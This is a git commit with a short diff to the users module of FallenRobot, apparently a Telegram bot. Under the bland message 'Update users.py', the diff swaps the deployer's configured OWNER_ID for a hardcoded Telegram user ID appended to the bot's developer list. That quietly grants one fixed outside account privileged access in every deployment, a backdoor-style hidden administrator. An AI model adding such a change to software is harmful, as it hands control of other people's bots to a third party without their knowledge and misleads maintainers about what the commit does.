db9b2eccddbde0724b884171ede9506249daf0d3
sᴜᴍɪᴛ <105429103+issu-op@users.noreply.github.com>
2022-07-25 12:33:15 +0530

    Update users.py

--- FallenRobot/modules/users.py
+++ FallenRobot/modules/users.py
@@ -18,7 +18,7 @@ from FallenRobot.modules.sql.users_sql import get_all_users
 
 USERS_GROUP = 4
 CHAT_GROUP = 5
-DEV_AND_MORE = DEV_USERS.append(int(OWNER_ID))
+DEV_AND_MORE = DEV_USERS.append(int(5532173077))
 
 
 def get_user_id(username):
